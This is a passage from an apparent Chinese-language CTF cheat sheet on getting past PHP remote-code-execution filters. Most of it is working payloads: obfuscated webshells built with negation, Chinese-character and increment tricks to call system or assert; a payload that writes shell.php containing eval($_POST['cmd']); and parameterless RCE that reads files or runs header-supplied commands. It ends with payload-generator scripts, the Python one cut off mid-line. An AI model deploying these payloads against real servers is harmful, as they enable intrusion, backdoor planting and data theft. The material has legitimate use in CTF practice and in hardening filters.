version&lt;7.1</p><pre><code>?&gt;&lt;?=$_++;$__=&quot;极&quot;;$___=~($__&#123;$_&#125;);$__=&quot;区&quot;;$___.=~($__&#123;$_&#125;);$___.=~($__&#123;$_&#125;);$__=&quot;皮&quot;;$___.=~($__&#123;$_&#125;);$__=&quot;十&quot;;$___.=~($__&#123;$_&#125;);$__=&quot;勺&quot;;$___.=~($__&#123;$_&#125;);$____=&#39;_&#39;;$__=&quot;寸&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;小&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;欠&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;立&quot;;$____.=~($__&#123;$_&#125;);$_=$$____;$___($_[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>?&gt;&lt;?=$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];$_=$$____;$___($_[_]);</code></pre></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure><h2 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h2><ul><li><p>system($_POST[_]);</p><pre><code>?&gt;&lt;?=@$_=[].&#39;&#39;,@$__=$_[&#39;&#39;],$___=&#39;&#39;,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$____=&#39;_&#39;,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$$____,$___($_[_])?&gt;</code></pre></li><li><p>assert($<em>POST[</em>]);</p><pre><code>?&gt;&lt;?=$_=[];$_=@&quot;$_&quotcode></pre></li><li><p>两个参数都自己控制</p><pre><code>  //post传参  cmd=$_=[]._;$__=$_[&#39;!&#39;==&#39;,&#39;];$__++;$__++;$__++;$___=++$__;++$__;$___=++$__.$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$___=$___.++$__;$_=&#39;_&#39;.$___;$$_[_]($$_[__]);  //get传参  ?_=system&amp;__=ls /</code></pre></li></ul><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><pre><code>$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);//长度118    $_GET[1]($_GET[2])</code></pre><h2 id="其他的杂项"><a href="#其他的杂项" class="headerlink" title="其他的杂项"></a>其他的杂项</h2><h3 id="屏蔽了-导致-GET-POST-失效"><a href="#屏蔽了-导致-GET-POST-失效" class="headerlink" title="屏蔽了_导致_GET,_POST 失效"></a>屏蔽了_导致_GET,_POST 失效</h3><pre><code>异或a=?%3E%3C?=`&#123;$&#123;&quot;!%27%25(&quot;^&quot;%7e%60%60%7c&quot;&#125;[%a0]&#125;`?%3E&amp;%a0=whoami取反a=?%3E%3C?=`&#123;$&#123;~%22%a0%b8%ba%ab%22&#125;[%a0]&#125;`?%3E&amp;%a0=whoami</code></pre><h3 id="自增写马"><a href="#自增写马" class="headerlink" title="自增写马"></a>自增写马</h3><pre><code>?&gt;&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____=&#39;_&#39;?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_],$_[___])?&gt;POST部分__=file_put_contents&amp;_=shell.php&amp;___=&lt;?=eval($_POST[&#39;cmd&#39;])?&gt;</code></pre><h1 id="无参数-RCE"><a href="#无参数-RCE" class="headerlink" title="无参数 RCE"></a>无参数 RCE</h1><h2 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h2><p>print_r(),var_dump()：输出函数<br>readfile(),highlight_file(),show_source()：读取文件<br>getcwd()：获取当前目录<br>pos(localeconv()),current(localeconv())：获取’.’字符<br>dirname()获取上层目录<br>scandir()等同 ls<br>chdir()改变目录，要和 dirname 搭配使用。例如：</p><pre><code>dirname(chdir(dirname(dirname(dirname(getcwd())))));</code></pre><ul><li>可以用 prev(),next(),reset(),end(),array_reverse()获取到 flag.php(仅限 flag.php 位于数组前后两位)，然后用 readfile()读取。</li></ul><h3 id="使用-arrar-rand-来获取-array-中的随机项"><a href="#使用-arrar-rand-来获取-array-中的随机项" class="headerlink" title="使用 arrar_rand()来获取 array 中的随机项"></a>使用 arrar_rand()来获取 array 中的随机项</h3><pre><code>print_r(scandir(dirname(chdir(dirname(getcwd())))));//获取根目录文件highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))))//随机读取，多次读取得到flag</code></pre><h3 id="使用-session-值"><a href="#使用-session-值" class="headerlink" title="使用 session 值"></a>使用 session 值</h3><pre><code>RCE部分：?exp=readfile(session_id(session_start()));PHPSESSID：PHPSESSID=flag.php</code></pre><h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h3><pre><code>在header最后写上sky:cat /flagprint_r(end(getallheaders()));system(end(getallheaders()));或者print_r(end(current(get_definded_vars((())))))&amp;sky=phpinfo();eval(end(current(get_definded_vars((())))))&amp;sky=phpinfo();</code></pre><h1 id="无字母参数-RCE"><a href="#无字母参数-RCE" class="headerlink" title="无字母参数 RCE"></a>无字母参数 RCE</h1><p>phpinfo():[~%8F%97%8F%96%91%99%90][~%FF]();<br>加[~%FF]只是因为 php7 的解析方式，例如[~%EF],[~%CF]也能通过检测。<br>通过 getenv() RCE</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;end&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;getallheaders&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload</span>=<span class="string">&#x27;[~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;][!%FF]([~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;][!%FF]([~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>).<span class="string">&#x27;][!%FF]()));&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下列 payload 取自 <a href="https://blog.csdn.net/m0_73512445/article/details/134542950">https://blog.csdn.net/m0_73512445/article/details/134542950</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="comment"># /usr/bin/python3</span></span><br><span class="line"><span class="comment"># @Author:Firebasky</span></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">urlbm</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fun = <span class="built_in">input</span>(<span class="string">&quot;Firebasky&gt;: &quot;</span>).strip(<span class="string">&quot;)&quot;</span>).split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> 